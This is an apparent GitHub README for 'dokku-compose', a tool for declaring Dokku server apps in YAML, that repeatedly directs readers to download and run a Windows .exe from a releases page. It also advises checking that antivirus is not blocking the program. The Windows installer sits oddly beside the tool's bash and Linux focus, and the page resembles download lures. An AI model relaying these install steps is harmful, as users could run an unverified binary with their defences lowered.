# 🚢 dokku-compose - Manage Servers with One YAML File

[![Download dokku-compose](https://img.shields.io/badge/Download-dokku--compose-%23FF6F61?style=for-the-badge)](https://github.com/hagerbOUIMEZGANE/dokku-compose/releases)

## 📝 What is dokku-compose?

dokku-compose lets you control your server apps using one simple text file. It uses Docker and YAML. You write your app and server setup in a single file. Then, dokku-compose sets up everything on your server. You can also create this file from apps already running on your server.

This tool helps manage apps on Dokku, a platform that hosts software like the cloud but on your own machine. You don’t need to install or configure apps one by one. Everything is declared in a file that dokku-compose reads.

## 🧰 System Requirements

Before downloading, check these:

- Windows 10 or later (64-bit)
- At least 4 GB RAM
- 1 GB free disk space for the app and Docker images
- Internet connection to download files and updates
- Dokku installed on a server you can access (dokku-compose communicates with Dokku on another machine or your own)

## 📂 What You Get

- A Windows app to create and manage dokku-compose YAML files
- Tools to export your running Dokku apps as YAML files
- Easy commands to deploy apps using these YAML files
- Help and examples to learn how to write your own declarations

## 🚀 Getting Started

1. Visit the download page by clicking the large button at the top or this link:  
[https://github.com/hagerbOUIMEZGANE/dokku-compose/releases](https://github.com/hagerbOUIMEZGANE/dokku-compose/releases)

2. On the releases page, find the latest version for Windows (usually a `.exe` file).

3. Download the `.exe` file and save it somewhere you can find it, like your Desktop or Downloads folder.

4. Double-click the `.exe` file. Windows may ask for permission. Choose "Yes" to run the installer.

5. Follow the installer steps. When done, dokku-compose will be ready to use.

## 💻 How to Use dokku-compose

### Create a YAML File to Declare Your Server

- Open dokku-compose from your Start menu.
- Click "New File".
- Write or copy your server and app setup in the YAML editor. If you need a guide, the app has templates to fill in.
- Save your YAML file when you are done.

### Deploy to Your Dokku Server

- Make sure you can connect to your Dokku server (you need its IP address or domain and your SSH credentials).
- In dokku-compose, choose your saved YAML file.
- Click "Deploy".
- The app will send your server instructions to Dokku. Your apps will install or update automatically.

### Export Running Apps

- Connect dokku-compose to your Dokku server.
- Choose "Export" to get a YAML file that describes what is already running.
- You can edit this file and redeploy with changes later.

## 🔧 Settings and Options

- **Server Access:** Add multiple servers and switch between them easily.
- **YAML Validation:** dokku-compose checks your YAML file for errors before deployment.
- **Logs:** Monitor deployment logs inside the app to see each step.
- **Backup:** Save your YAML files securely and recover your setups quickly.

## 📥 Download and Install dokku-compose on Windows

You can get the app by visiting this page:  
[https://github.com/hagerbOUIMEZGANE/dokku-compose/releases](https://github.com/hagerbOUIMEZGANE/dokku-compose/releases)

Look for the latest `.exe` installer under "Assets". The file name will include "Windows" or ".exe".

- Click the file name to start downloading.
- Once downloaded, open the file.
- Follow the installation instructions.
- If Windows asks for permission, allow it.
- When done, find dokku-compose in your Start menu or on your desktop.

If you encounter errors, check that your Windows is up to date and you have a working internet connection.

## ❓ Troubleshooting

- **App won’t start:** Make sure your antivirus or firewall is not blocking the program.
- **Cannot connect to Dokku server:** Verify your server address and SSH keys. Dokku requires secure login.
- **Deployment fails:** Look at the log output inside dokku-compose. It shows what failed and why.

## 🔄 Updating dokku-compose

Check the releases page regularly for updates. Download the new `.exe` and run it to replace your old version. Your settings and saved files stay safe.

## 📖 More Information

You don’t need programming skills to use dokku-compose. The app guides you step-by-step. If you want to learn how YAML files work or how Dokku manages apps, the tool includes easy tutorials.

For advanced users, dokku-compose offers command-line options and configuration files.

---

## Topics

bash, deployment, devops, docker, dokku, infrastructure-as-code, paas, self-hosted, server-management, yaml